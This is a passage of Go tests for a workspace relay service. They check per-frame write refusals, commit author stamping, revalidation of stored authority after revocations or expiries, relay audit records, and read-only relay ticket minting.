						if err := w.CreateAccessMember(t.Context(), accessstore.Member{OrganizationID: record.OrganizationID, UserID: subject, Email: subject + "@example.test", MembershipID: "membership_" + subject, Role: test.role, Active: !test.inactive, PrincipalID: principal, CreatedAt: now, UpdatedAt: now}); err != nil {
							return err
						}
						if test.grant != "" {
							return w.SetAccessProjectGrant(t.Context(), accessstore.ProjectGrant{OrganizationID: record.OrganizationID, UserID: subject, ProjectID: record.ProjectID, CanWrite: test.grant == "write"})
						}
						return nil
					}); err != nil {
						t.Fatal(err)
					}
					connection = &relayConnection{ID: "relayconn_" + subject, Subject: subject, SessionHash: "session_hash_" + subject, HostedRole: test.role}
				}
				frame := gitFrame(test.frameType, "Commit from the authority table")
				if test.exec {
					frame = execRunFrame(hubapi.NewID("actionrun"), workspacesession.Action{ID: hubapi.NewID("action"), Command: "make test"})
				}
				if code := relay.refuseRelayWrite(t.Context(), record, connection, frame); code != test.want {
					t.Fatalf("refuseRelayWrite = %q, want %q", code, test.want)
				}
			}
		})
	}
}

// A frame on another channel is never the git channel's business, whatever its
// type happens to be called. "commit" is a plausible name on a channel that
// has not been written yet, and reading the type without the channel would
// refuse it on a rule that does not apply to it.
func TestWorkspaceRelayGitWriteCheckIgnoresOtherChannels(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	f.markReadOnly(t)
	record := f.record(t)
	connection := f.seedHostedMember(t, "other-channel", "member", "read")
	for _, channel := range []string{workspacesession.ChannelFiles, workspacesession.ChannelDiff, workspacesession.ChannelPreview} {
		frame := workspacesession.Frame{Channel: channel, Type: workspacesession.TypeGitCommit}
		if code := f.service.workspaces.refuseRelayWrite(t.Context(), record, connection, frame); code != "" {
			t.Fatalf("the %s channel was refused with %q", channel, code)
		}
	}
}

// The author stamped onto every person-originated frame, which is who a commit
// is made as.
func TestRelayActorStampsTheAuthor(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	service := newClockedPostgresNativeService(t, Config{Clock: func() time.Time { return now }})
	organizations := []tracker.OrganizationID{tracker.OrganizationID(service.localOrganization), tracker.OrganizationID(service.localOrganization + "_second")}
	for index, organization := range organizations {
		email := "ada.lovelace@example.test"
		if index == 1 {
			email = "other.member@example.test"
		}
		if err := service.accessWrite(t.Context(), organization, func(w tenantstore.Writer) error {
			members := []struct {
				name, subject, email string
				active               bool
			}{
				{name: "ada.lovelace", subject: "user_ada.lovelace", email: email, active: true},
				{name: "inactive", subject: "user_inactive", email: "active.member@example.test", active: index == 1},
				{name: "operator", subject: "operator-relay", email: "named.member@example.test", active: true},
			}
			if index == 1 {
				members = append(members, struct {
					name, subject, email string
					active               bool
				}{name: "support", subject: "support@example.test", email: "support.member@example.test", active: true})
			}
			for _, member := range members {
				principal := "hosted_" + member.name
				if err := w.CreateAccessCredential(t.Context(), accessstore.Credential{OrganizationID: organization, ID: principal, Name: principal, Hash: apikey.HashToken(string(organization) + "_" + principal), Fingerprint: principal, Scope: "operator", NativeOnly: true, CreatedAt: now, UpdatedAt: now, ProjectAccess: "selected", Kind: "personal"}); err != nil {
					return err
				}
				if err := w.CreateAccessMember(t.Context(), accessstore.Member{OrganizationID: organization, UserID: member.subject, Email: member.email, MembershipID: "membership_" + member.name, Role: "member", Active: member.active, PrincipalID: principal, CreatedAt: now, UpdatedAt: now}); err != nil {
					return err
				}
			}
			return nil
		}); err != nil {
			t.Fatal(err)
		}
	}
	for _, test := range []struct {
		name         string
		organization tracker.OrganizationID
		principal    relayPrincipal
		wantName     string
		wantEmail    string
	}{
		{
			name: "hosted member", organization: organizations[0],
			principal: relayPrincipal{
				credential:  hubapi.APICredential{Hosted: &auth.HostedIdentity{Subject: "user_ada.lovelace"}},
				subject:     "user_ada.lovelace",
				principalID: "hosted_ada.lovelace",
			},
			wantName: "Ada Lovelace", wantEmail: "ada.lovelace@example.test",
		},
		{
			name: "same subject in second tenant", organization: organizations[1],
			principal: relayPrincipal{
				credential:  hubapi.APICredential{Hosted: &auth.HostedIdentity{Subject: "user_ada.lovelace"}},
				subject:     "user_ada.lovelace",
				principalID: "hosted_ada.lovelace",
			},
			wantName: "Other Member", wantEmail: "other.member@example.test",
		},
		{
			name: "inactive member", organization: organizations[0],
			principal: relayPrincipal{
				credential:  hubapi.APICredential{Hosted: &auth.HostedIdentity{Subject: "user_inactive"}},
				subject:     "user_inactive",
				principalID: "hosted_inactive",
			},
			wantName: "user_inactive",
		},
		{
			name: "same subject active in second tenant", organization: organizations[1],
			principal: relayPrincipal{
				credential:  hubapi.APICredential{Hosted: &auth.HostedIdentity{Subject: "user_inactive"}},
				subject:     "user_inactive",
				principalID: "hosted_inactive",
			},
			wantName: "Active Member", wantEmail: "active.member@example.test",
		},
		{
			// A support actor holds no membership row, so there is no email to
			// author with and the runner refuses the commit. That is the only
			// correct answer: attributing it to the person being stood in for
			// would put a name in the repository's history that never typed
			// it.
			name: "support actor", organization: organizations[0],
			principal: relayPrincipal{
				credential: hubapi.APICredential{Hosted: &auth.HostedIdentity{
					Subject: "user_ada.lovelace", SupportActor: "support@example.test",
				}},
				subject:       "support@example.test",
				principalID:   "hosted_ada.lovelace",
				supportReason: "customer-request",
			},
			wantName: "support@example.test",
		},
		{
			// An operator token is not a person. It names the credential so a
			// runner's log says which one acted, and authors nothing.
			name: "operator token", organization: organizations[0],
			principal: relayPrincipal{
				credential: hubapi.APICredential{Name: "operator-relay", ID: "tok_1"},
				subject:    "operator-relay", principalID: "tok_1",
			},
			wantName: "operator-relay",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			connection := &relayConnection{ID: "relayconn_actor"}
			actor := service.relayActor(t.Context(), test.organization, connection, test.principal)
			if actor.Name != test.wantName || actor.Email != test.wantEmail {
				t.Fatalf("actor = %+v, want name %q and email %q", actor, test.wantName, test.wantEmail)
			}
			if actor.PrincipalID != test.principal.principalID || actor.Subject != test.principal.subject {
				t.Fatalf("actor = %+v, want the principal's own tuple", actor)
			}
			if actor.ConnectionID != connection.ID {
				t.Fatalf("actor connection = %q, want %q", actor.ConnectionID, connection.ID)
			}
		})
	}
}

func TestWorkspaceRelayRevalidationFencesStoredAuthority(t *testing.T) {
	base := time.Now().UTC().Truncate(time.Microsecond)
	var clock atomic.Int64
	clock.Store(base.UnixNano())
	f := newSharedRouteFixture(t, func(cfg *Config) {
		cfg.Hosted.SharedEntry = nil
		cfg.Hosted.Provider = newHostedSecurityProvider()
		cfg.Clock = func() time.Time { return time.Unix(0, clock.Load()).UTC() }
	})
	for caseIndex, test := range []struct {
		name, fault             string
		token                   bool
		localDenied, fullDenied bool
	}{
		{name: "current"},
		{name: "read-only project grant", fault: "read_grant"},
		{name: "inactive member", fault: "member", localDenied: true, fullDenied: true},
		{name: "revoked session", fault: "session", localDenied: true, fullDenied: true},
		{name: "session expiry boundary", fault: "session_expiry", localDenied: true, fullDenied: true},
		{name: "withdrawn grant", fault: "grant", localDenied: true, fullDenied: true},
		{name: "changed principal", fault: "principal", fullDenied: true},
		{name: "changed session", fault: "session_id", fullDenied: true},
		{name: "provider membership revoked", fault: "provider_member", fullDenied: true},
		{name: "provider session revoked", fault: "provider_session", fullDenied: true},
		{name: "terminal workspace", fault: "terminal", localDenied: true, fullDenied: true},
		{name: "workspace no longer bound", fault: "unbound", localDenied: true},
		{name: "released lease", fault: "lease_released", localDenied: true},
		{name: "lease expiry boundary", fault: "lease_expiry", localDenied: true},
		{name: "mismatched fence rejected by owner", fault: "fence"},
		{name: "wrong project", fault: "project", localDenied: true, fullDenied: true},
		{name: "wrong tenant", fault: "organization", localDenied: true, fullDenied: true},
		{name: "current token", token: true},
		{name: "revoked token waits for full refresh", token: true, fault: "token_revoked", fullDenied: true},
		{name: "expired token waits for full refresh", token: true, fault: "token_expiry", fullDenied: true},
		{name: "reporter owns subject", fault: "reporter_own"},
		{name: "reporter legacy subject", fault: "reporter_legacy", fullDenied: true},
		{name: "reporter other subject", fault: "reporter_other", fullDenied: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			clock.Store(base.UnixNano())
			t.Cleanup(func() { clock.Store(base.UnixNano()) })
			type fixture struct {
				server     *Service
				c          echo.Context
				scope      hubscope.NativeScope
				record     workspaceRecord
				connection *relayConnection
				workspace  postgres.WorkspaceSession
				lease      leasestore.Lease
				subject    string
				membership string
				session    string
			}
			var fixtures []fixture
			for _, organization := range []tracker.OrganizationID{"org_startup", "org_other"} {
				server := f.services[string(organization)]
				provider := server.config.Hosted.Provider.(*hostedSecurityProvider)
				suffix := fmt.Sprintf("relay_%02d", caseIndex)
				project := tracker.ProjectID("prj_" + suffix)
				workspaceID := fmt.Sprintf("ws_%032x", caseIndex+1)
				subject := "user_" + suffix
				role := "member"
				if strings.HasPrefix(test.fault, "reporter_") {
					role = "reporter"
				}
				expires := base.Add(7 * 24 * time.Hour)
				if test.fault == "session_expiry" {
					expires = base.Add(time.Hour)
				}
				identity := auth.Identity{Subject: subject, Email: suffix + "@example.test", EmailVerified: true, Hosted: &auth.HostedIdentity{Subject: subject, OrganizationID: server.config.Hosted.WorkOSOrganizationID, SessionID: "session_" + suffix, CreatedAt: base, ExpiresAt: expires}}
				membership, err := provider.CreateMembership(t.Context(), subject, identity.Hosted.OrganizationID, role)
				if err != nil {
					t.Fatal(err)
				}
				provider.mu.Lock()
				provider.sessions[identity.Hosted.SessionID] = *identity.Hosted
				provider.mu.Unlock()
				if err := server.addHostedMember(t.Context(), identity, membership); err != nil {
					t.Fatal(err)
				}
				cookie, _, err := server.hostedSessions.CreateIdentitySession(t.Context(), identity)
				if err != nil {
					t.Fatal(err)
				}
				request := httptest.NewRequest(http.MethodGet, "/relay", nil).WithContext(t.Context())
				request.AddCookie(&http.Cookie{Name: hostedCookie, Value: cookie})
				c := server.echo.NewContext(request, httptest.NewRecorder())
				principal, err := server.relayPrincipal(t.Context(), c)
				if err != nil {
					t.Fatal(err)
				}
				value := fixture{server: server, c: c, subject: subject, membership: membership.ID, session: identity.Hosted.SessionID}
				runner, machine, worker := "runner_"+suffix, "machine_"+suffix, "worker_"+suffix
				tokenID, rawToken := "token_"+suffix, "example-token-"+suffix
				if err := server.config.TenantRepository.WriteTenant(t.Context(), organization, corestore.Serving, func(w tenantstore.Writer) error {
					if _, err := w.CreateProjectRecord(t.Context(), projectstore.Record{Core: corestore.Project{OrganizationID: organization, ID: project, Name: suffix, Slug: strings.ReplaceAll(suffix, "_", "-"), Profile: "native"}, States: nativeFixtureStates()}); err != nil {
						return err
					}
					if err := w.SetAccessProjectGrant(t.Context(), accessstore.ProjectGrant{OrganizationID: organization, UserID: subject, ProjectID: project, CanWrite: test.fault != "read_grant"}); err != nil {
						return err
					}
					if err := w.SetAccessTokenGrant(t.Context(), accessstore.TokenGrant{OrganizationID: organization, TokenID: principal.principalID, ProjectID: project}); err != nil {
						return err
					}
					for _, credential := range []accessstore.Credential{
						{OrganizationID: organization, ID: worker, Name: worker, Hash: apikey.HashToken(worker), Scope: "worker", NativeOnly: true, Kind: "service", ProjectAccess: "selected", CreatedAt: base, UpdatedAt: base},
						{OrganizationID: organization, ID: tokenID, Name: tokenID, Hash: apikey.HashToken(rawToken), Scope: "operator", NativeOnly: true, Kind: "service", ProjectAccess: "selected", CreatedAt: base, UpdatedAt: base, ExpiresAt: new(base.Add(time.Hour))},
					} {
						if err := w.CreateAccessCredential(t.Context(), credential); err != nil {
							return err
						}
					}
					if err := w.SetAccessTokenGrant(t.Context(), accessstore.TokenGrant{OrganizationID: organization, TokenID: tokenID, ProjectID: project}); err != nil {
						return err
					}
					if err := w.CreateRunnerEnrollment(t.Context(), runnerstore.Enrollment{OrganizationID: organization, ID: "enrollment_" + suffix, RunnerID: runner, MachineID: tracker.MachineID(machine), TokenHash: apikey.HashToken("enrollment_" + suffix), Scope: "projects", ProjectIDs: []tracker.ProjectID{project}, Operations: []string{runnerauth.Read, runnerauth.Claim}, CreatedAt: base, ExpiresAt: expires, CreatedBy: principal.principalID}); err != nil {
						return err
					}
					if err := w.RedeemRunnerEnrollment(t.Context(), "enrollment_"+suffix, runner, tracker.MachineID(machine), base); err != nil {
						return err
					}
					if err := w.RegisterMachine(t.Context(), leasestore.Machine{OrganizationID: organization, ID: machine, Hostname: "example-host-" + suffix, Capacity: 2}); err != nil {
						return err
					}
					if err := w.CreateRunnerIdentity(t.Context(), runnerstore.Identity{OrganizationID: organization, RunnerID: runner, MachineID: tracker.MachineID(machine), TokenID: worker, EnrollmentID: "enrollment_" + suffix, Scope: "projects", State: "active", Revision: 1, Operations: []string{runnerauth.Read, runnerauth.Claim}, CapacityLimit: 2, ReportedCapacity: 2, ProjectIDs: []tracker.ProjectID{project}, CreatedAt: base, ExpiresAt: expires, LastHeartbeatAt: base}); err != nil {
						return err
					}
					if _, err := w.CreateWorkItem(t.Context(), corestore.WorkItem{OrganizationID: organization, ProjectID: project, NativeID: tracker.NativeWorkItemID("wi_subject_" + suffix), Number: 1, Title: "Example subject", ActorKind: new("human"), ActorPrincipalID: new(principal.principalID)}); err != nil {
						return err
					}
					item, err := w.CreateWorkItem(t.Context(), corestore.WorkItem{OrganizationID: organization, ProjectID: project, NativeID: tracker.NativeWorkItemID("wi_dispatch_" + suffix), Number: 2, Title: "Example workspace item"})
					if err != nil {
						return err
					}
					owner := w.(postgres.WorkspaceWriter)
					value.workspace, err = owner.CreateWorkspaceSession(t.Context(), postgres.WorkspaceCreate{OrganizationID: organization, ProjectID: project, ID: workspaceID, SubjectWorkItemID: "wi_subject_" + suffix, Ref: "refs/heads/example", Requires: []string{workspacesession.CapabilityFiles}, IdleTimeoutSeconds: 300, ExpiresAt: base.Add(7 * 24 * time.Hour), RequestedExpiresAt: base.Add(time.Hour), CreatedBy: principal.principalID, CreatedAt: base})
					if err != nil {
						return err
					}
					if err := owner.PutWorkspaceItem(t.Context(), claimstore.WorkspaceItem{OrganizationID: organization, ProjectID: project, WorkItemID: item.NativeID, WorkspaceID: workspaceID, CreatedAt: base}); err != nil {
						return err
					}
					value.lease, err = w.Claim(t.Context(), leasestore.Claim{IssueID: item.ID, ExpectedRevision: item.Revision, MachineID: machine, RunnerID: runner, SessionID: "runner_session_" + suffix, LeaseID: "lease_" + suffix, TTL: 48 * time.Hour})
					if err != nil {
						return err
					}
					for _, state := range []string{workspacesession.StateStarting, workspacesession.StateReady} {
						current := value.workspace
						value.workspace, err = owner.UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: organization, ProjectID: project, ID: workspaceID, ExpectedRevision: current.Revision, ExpectedRunnerID: current.RunnerID, ExpectedLeaseID: current.LeaseID, ExpectedFencingToken: current.FencingToken, State: state, RunnerID: runner, MachineID: machine, LeaseID: value.lease.LeaseID, FencingToken: value.lease.FencingToken, UpdatedAt: base})
						if err != nil {
							return err
						}
					}
					return nil
				}); err != nil {
					t.Fatal(err)
				}
				if test.token {
					credential, _, err := server.authenticateTenantAPIHash(t.Context(), organization, apikey.HashToken(rawToken), "", "")
					if err != nil {
						t.Fatal(err)
					}
					request.Header.Set(echo.HeaderAuthorization, "Bearer "+rawToken)
					c.Set("hub_api_credential", credential)
					principal, err = server.relayPrincipal(t.Context(), c)
					if err != nil {
						t.Fatal(err)
					}
				}
				value.connection = &relayConnection{ID: "connection_" + suffix, WorkspaceID: workspaceID, PrincipalID: principal.principalID, SessionID: principal.sessionID, SessionHash: principal.credential.SessionHash, Subject: subject}
				value.scope = hubscope.NativeScope{Organization: organization, Project: project, Credential: principal.credential}
				value.record = workspaceRecord{ID: workspaceID, OrganizationID: organization, ProjectID: project, SubjectWorkItemID: value.workspace.SubjectWorkItemID, LeaseID: tracker.LeaseID(value.workspace.LeaseID), FencingToken: tracker.FencingToken(value.workspace.FencingToken)}
				fixtures = append(fixtures, value)
			}
			for index := range fixtures {
				value := &fixtures[index]
				relay := &workspaceService{server: value.server}
				if err := relay.revalidatePersonLocally(t.Context(), value.record, value.connection); err != nil {
					t.Fatalf("%s current local authority=%v", value.scope.Organization, err)
				}
				if err := relay.revalidatePerson(t.Context(), value.c, value.scope, value.record, value.connection); err != nil {
					t.Fatalf("%s current full authority=%v", value.scope.Organization, err)
				}
			}
			for index := range fixtures {
				clock.Store(base.UnixNano())
				value := &fixtures[index]
				relay := &workspaceService{server: value.server}
				if err := relay.revalidatePersonLocally(t.Context(), value.record, value.connection); err != nil {
					t.Fatalf("%s unaffected local authority=%v", value.scope.Organization, err)
				}
				if err := relay.revalidatePerson(t.Context(), value.c, value.scope, value.record, value.connection); err != nil {
					t.Fatalf("%s unaffected full authority=%v", value.scope.Organization, err)
				}
				update := func(state string, fencing int64) error {
					return value.server.config.TenantRepository.WriteTenant(t.Context(), value.scope.Organization, corestore.Serving, func(w tenantstore.Writer) error {
						current := value.workspace
						updated, err := w.(postgres.WorkspaceWriter).UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: current.OrganizationID, ProjectID: current.ProjectID, ID: current.ID, ExpectedRevision: current.Revision, ExpectedRunnerID: current.RunnerID, ExpectedLeaseID: current.LeaseID, ExpectedFencingToken: current.FencingToken, State: state, RunnerID: current.RunnerID, MachineID: current.MachineID, LeaseID: current.LeaseID, FencingToken: fencing, UpdatedAt: base})
						if err == nil {
							value.workspace = updated
						}
						return err
					})
				}
				var err error
				switch test.fault {
				case "member", "session", "grant", "lease_released", "token_revoked", "reporter_legacy", "reporter_other":
					err = value.server.config.TenantRepository.WriteTenant(t.Context(), value.scope.Organization, corestore.Serving, func(w tenantstore.Writer) error {
						switch test.fault {
						case "member":
							member, err := w.AccessMember(t.Context(), value.subject)
							if err != nil {
								return err
							}
							member.Active = false
							return w.UpdateAccessMember(t.Context(), member)
						case "session":
							return w.RevokeAccessSession(t.Context(), value.connection.SessionHash, base)
						case "grant":
							return w.DeleteAccessProjectGrant(t.Context(), value.subject, value.scope.Project)
						case "lease_released":
							_, err := w.Release(t.Context(), leasestore.Fence{LeaseID: value.lease.LeaseID, FencingToken: value.lease.FencingToken}, "example")
							return err
						case "token_revoked":
							return w.RevokeAccessCredential(t.Context(), value.connection.PrincipalID, base)
						default:
							item, err := w.WorkItem(t.Context(), value.scope.Project, tracker.NativeWorkItemID(value.record.SubjectWorkItemID))
							if err != nil {
								return err
							}
							item.ActorPrincipalID = nil
							if test.fault == "reporter_other" {
								item.ActorPrincipalID = new("other_principal")
							}
							_, err = w.UpdateWorkItem(t.Context(), item)
							return err
						}
					})
				case "session_expiry", "token_expiry":
					clock.Store(base.Add(time.Hour).UnixNano())
				case "lease_expiry":
					clock.Store(value.lease.ExpiresAt.UnixNano())
				case "principal":
					value.connection.PrincipalID = "other_principal"
				case "session_id":
					value.connection.SessionID = "other_session"
				case "provider_member", "provider_session":
					provider := value.server.config.Hosted.Provider.(*hostedSecurityProvider)
					provider.mu.Lock()
					if test.fault == "provider_session" {
						delete(provider.sessions, value.session)
					} else {
						member := provider.members[value.membership]
						member.Status = "inactive"
						provider.members[value.membership] = member
					}
					provider.mu.Unlock()
				case "terminal":
					for _, state := range []string{workspacesession.StateClosing, workspacesession.StateClosed} {
						if err = update(state, value.workspace.FencingToken); err != nil {
							break
						}
					}
				case "unbound":
					err = update(workspacesession.StateRequested, value.workspace.FencingToken)
				case "fence":
					if err := update(workspacesession.StateReady, value.workspace.FencingToken+1); !errors.Is(err, corestore.ErrRevisionConflict) {
						t.Fatalf("mismatched fence update=%v, want revision conflict", err)
					}
				case "project":
					value.record.ProjectID = "prj_missing"
				case "organization":
					if value.record.OrganizationID == "org_startup" {
						value.record.OrganizationID = "org_other"
					} else {
						value.record.OrganizationID = "org_startup"
					}
				}
				if err != nil {
					t.Fatal(err)
				}
				if err := relay.revalidatePersonLocally(t.Context(), value.record, value.connection); (err != nil) != test.localDenied {
					t.Fatalf("%s local error=%v, want denied=%v", value.scope.Organization, err, test.localDenied)
				}
				if err := relay.revalidatePerson(t.Context(), value.c, value.scope, value.record, value.connection); (err != nil) != test.fullDenied {
					t.Fatalf("%s full error=%v, want denied=%v", value.scope.Organization, err, test.fullDenied)
				}
				if test.fault == "" || test.fault == "terminal" || test.fault == "lease_released" {
					activity := &workspaceService{server: value.server, logger: value.server.config.Logger}
					readWorkspace := func() (postgres.WorkspaceSession, error) {
						var row postgres.WorkspaceSession
						err := value.server.accessRead(t.Context(), value.scope.Organization, func(r tenantstore.Reader) error {
							var err error
							row, err = r.(postgres.WorkspaceReader).WorkspaceSession(t.Context(), value.scope.Project, value.record.ID)
							return err
						})
						return row, err
					}
					if test.fault == "" {
						clock.Store(base.Add(2 * time.Second).UnixNano())
						if err := value.server.accessWrite(t.Context(), value.scope.Organization, func(w tenantstore.Writer) error {
							current := value.workspace
							_, err := w.(postgres.WorkspaceWriter).UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: current.OrganizationID, ProjectID: current.ProjectID, ID: current.ID, ExpectedRevision: current.Revision, ExpectedRunnerID: current.RunnerID, ExpectedLeaseID: current.LeaseID, ExpectedFencingToken: current.FencingToken, State: current.State, Reason: "example-bound", RunnerID: current.RunnerID, MachineID: current.MachineID, LeaseID: current.LeaseID, FencingToken: current.FencingToken, HeadSHA: strings.Repeat("a", 40), Capabilities: []string{"files", "diff"}, Isolation: workspacesession.IsolationContainer, Worktree: "retained", MachineHostname: "example-host", WorktreePath: "/workspace/example", ReadOnly: true, OpenedAt: &base, LastActivityAt: new(base.Add(time.Second)), LastHeartbeatAt: new(base.Add(2 * time.Second)), UpdatedAt: base.Add(2 * time.Second)})
							return err
						}); err != nil {
							t.Fatal(err)
						}
					}
					before, err := readWorkspace()
					if err != nil {
						t.Fatal(err)
					}
					touchedAt := base.Add(time.Minute)
					clock.Store(touchedAt.UnixNano())
					activity.touchWorkspace(t.Context(), value.record)
					after, err := readWorkspace()
					if err != nil {
						t.Fatal(err)
					}
					want := before
					if test.fault == "" {
						want.LastActivityAt = &touchedAt
					}
					if !reflect.DeepEqual(after, want) {
						t.Fatalf("%s activity changed owner metadata or ignored terminal/lease fence: before=%+v after=%+v", value.scope.Organization, before, after)
					}
					if test.fault == "" {
						principal, err := value.server.relayPrincipal(t.Context(), value.c)
						if err != nil {
							t.Fatal(err)
						}
						if err := activity.openRelayAudit(t.Context(), value.record, value.connection, principal); err != nil {
							t.Fatal(err)
						}
						readAudit := func() (postgres.RelaySession, error) {
							var row postgres.RelaySession
							err := value.server.accessRead(t.Context(), value.scope.Organization, func(r tenantstore.Reader) error {
								rows, err := r.(postgres.RelayActionReader).RelaySessions(t.Context(), postgres.RelaySessionsInput{OrganizationID: value.scope.Organization, ProjectID: value.scope.Project, WorkspaceID: value.record.ID, Limit: 2})
								if err != nil {
									return err
								}
								if len(rows) != 1 {
									return fmt.Errorf("relay audit count=%d, want1", len(rows))
								}
								row = rows[0]
								return nil
							})
							return row, err
						}
						row, err := readAudit()
						if err != nil || row.OrganizationID != value.scope.Organization || row.ProjectID != value.scope.Project || row.WorkspaceID != value.record.ID || row.ID != value.connection.AuditID || row.ConnectionID != value.connection.ID || row.PrincipalID != principal.principalID || row.Subject != principal.subject || row.SupportReason != principal.supportReason || len(row.Channels) != 0 || !row.OpenedAt.Equal(touchedAt) || row.ClosedAt != nil {
							t.Fatalf("scoped opened audit=%+v error=%v", row, err)
						}
						value.connection.CountIn(13)
						value.connection.CountOut(29)
						wrongConnection := &relayConnection{ID: "other_connection", AuditID: value.connection.AuditID}
						activity.closeRelayAudit(t.Context(), value.record, wrongConnection, "wrong_connection")
						foreign := value.record
						if foreign.OrganizationID == "org_startup" {
							foreign.OrganizationID = "org_other"
						} else {
							foreign.OrganizationID = "org_startup"
						}
						activity.closeRelayAudit(t.Context(), foreign, value.connection, "wrong_tenant")
						row, err = readAudit()
						if err != nil || row.ClosedAt != nil || row.BytesIn != 0 || row.BytesOut != 0 || row.CloseReason != "" {
							t.Fatalf("foreign close changed audit=%+v error=%v", row, err)
						}
						activity.closeRelayAudit(t.Context(), value.record, value.connection, "person_closed")
						row, err = readAudit()
						if err != nil || row.ClosedAt == nil || !row.ClosedAt.Equal(touchedAt) || row.BytesIn != 13 || row.BytesOut != 29 || row.CloseReason != "person_closed" {
							t.Fatalf("audit close lost exact bytes/reason/time: %+v error=%v", row, err)
						}
						value.connection.CountIn(7)
						value.connection.CountOut(11)
						clock.Store(touchedAt.Add(time.Second).UnixNano())
						activity.closeRelayAudit(t.Context(), value.record, value.connection, "later_close")
						again, err := readAudit()
						if err != nil || !reflect.DeepEqual(again, row) {
							t.Fatalf("already closed audit changed: before=%+v after=%+v error=%v", row, again, err)
						}
					}
				}
			}
		})
	}
}

// newHostedWorkspaceFixture is the hosted security fixture with workspaces and
// the terminal turned on, so a hosted member's cookie session can reach the
// workspace routes.
func newHostedWorkspaceFixture(t *testing.T) hostedSecurityFixture {
	t.Helper()
	provider := newHostedSecurityProvider()
	service := openTestService(t, Config{
		Workspace: &WorkspaceConfig{Enabled: true, Terminal: WorkspaceTerminalConfig{Enabled: true}},
		Hosted: &HostedConfig{
			OrganizationID:       "org_security",
			WorkOSOrganizationID: "org_provider",
			BootstrapSubject:     "user_owner",
			PublicURL:            "http://127.0.0.1:7777",
			Provider:             provider,
		},
	})
	states := []tracker.NativeState{{Name: "Todo", Dispatchable: true, Transitions: []string{"Done"}}, {Name: "Done", Terminal: true, Transitions: []string{"Todo"}}}
	project := tracker.ProjectID("prj_security")
	if err := service.accessWrite(t.Context(), tracker.OrganizationID(service.config.Hosted.OrganizationID), func(writer tenantstore.Writer) error {
		_, err := writer.CreateProjectRecord(t.Context(), projectstore.Record{Core: corestore.Project{OrganizationID: tracker.OrganizationID(service.config.Hosted.OrganizationID), ID: project, Name: "Example workspace project", Profile: "native"}, States: states})
		return err
	}); err != nil {
		t.Fatal(err)
	}
	return hostedSecurityFixture{service: service, provider: provider, project: project, base: "/api/v2/organizations/org_security/projects/" + string(project)}
}

// A relay ticket is a read: the relay upgrade checks project read, and the
// surfaces that write are refused per frame. So a read-only member and a
// viewer can mint one and still cannot commit, push or open a terminal.
func TestWorkspaceRelayTicketNeedsOnlyRead(t *testing.T) {
	t.Parallel()
	f := newHostedWorkspaceFixture(t)
	writer := f.user(t, "writer", "member", "writer@example.test", "write", "")
	issue := f.seedIssue(t, 1)
	response := f.request(t, writer, http.MethodPost, f.base+"/workspaces", map[string]any{
		"idempotency_key": hubapi.NewID("wsk"), "work_item_id": string(issue),
	})
	requireNativeStatus(t, response, http.StatusCreated)
	var session workspacesession.Session
	decodeHubResponse(t, response, &session)
	var stored postgres.WorkspaceSession
	if err := f.service.accessRead(t.Context(), tracker.OrganizationID(f.service.config.Hosted.OrganizationID), func(reader tenantstore.Reader) error {
		var err error
		stored, err = reader.(postgres.WorkspaceReader).WorkspaceSession(t.Context(), f.project, session.ID)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	record := relayWorkspaceRecord(stored)
	record.Capabilities = &workspacesession.Capabilities{Files: true, Diff: true, Terminal: true, Git: true}
	tests := []struct {
		name         string
		role         string
		grant        string
		wantMint     int
		wantWriteRef string
	}{
		{name: "viewer with read", role: "viewer", grant: "read", wantMint: http.StatusCreated, wantWriteRef: workspacesession.CodeForbidden},
		{name: "member with read", role: "member", grant: "read", wantMint: http.StatusCreated, wantWriteRef: workspacesession.CodeForbidden},
		{name: "member with write", role: "member", grant: "write", wantMint: http.StatusCreated},
		{name: "member with no grant", role: "member", wantMint: http.StatusNotFound, wantWriteRef: workspacesession.CodeForbidden},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			name := strings.ReplaceAll(test.name, " ", "-")
			user := f.user(t, name, test.role, name+"@example.test", test.grant, "")
			minted := f.request(t, user, http.MethodPost, f.base+"/workspaces/"+session.ID+"/relay-tickets", nil)
			if minted.Code != test.wantMint {
				t.Fatalf("mint status = %d, want %d: %s", minted.Code, test.wantMint, minted.Body.String())
			}
			connection := &relayConnection{
				ID: "relayconn_" + name, WorkspaceID: session.ID, Subject: user.identity.Subject,
				SessionHash: "session_hash_" + name, HostedRole: test.role,
			}
			if code := f.service.workspaces.refuseRelayWrite(t.Context(), record, connection, gitFrame(workspacesession.TypeGitCommit, "commit")); code != test.wantWriteRef {
				t.Fatalf("git commit refusal = %q, want %q", code, test.wantWriteRef)
			}
			if code := f.service.workspaces.refuseRelayWrite(t.Context(), record, connection, gitFrame(workspacesession.TypeGitStatus, "")); code != "" {
				t.Fatalf("git status refusal = %q, want none", code)
			}
			if code := f.service.workspaces.refuseTerminal(t.Context(), record, connection, terminalOpenFrame()); code != workspacesession.CodeForbidden {
				t.Fatalf("terminal refusal = %q, want forbidden (no runner grant)", code)
			}
		})
	}
}

// A connection checks its workspace before the upgrade and joins the relay
// after it, and the workspace can end in between. committed() only closes the
// connections already attached, so the re-check after attaching is what tells
// a late joiner its workspace is over instead of leaving it waiting.
func TestWorkspaceRelayClosesAConnectionThatJoinedAfterTheWorkspaceEnded(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name     string
		state    string
		runner   bool
		wantCode string
	}{
		{name: "person on a closed workspace", state: workspacesession.StateClosed, wantCode: workspacesession.CodeWorkspaceClosed},
		{name: "person on a failed workspace", state: workspacesession.StateFailed, wantCode: workspacesession.CodeWorkspaceClosed},
		{name: "runner on a closed workspace", state: workspacesession.StateClosed, runner: true, wantCode: workspacesession.CodeWorkspaceClosed},
		{name: "runner on an unreachable workspace", state: workspacesession.StateUnreachable, runner: true, wantCode: workspacesession.CodeStaleExecution},
		{name: "runner on a re-requested workspace", state: workspacesession.StateRequested, runner: true, wantCode: workspacesession.CodeStaleExecution},
		{name: "person on an unreachable workspace stays", state: workspacesession.StateUnreachable},
		{name: "person on a ready workspace stays", state: workspacesession.StateReady},
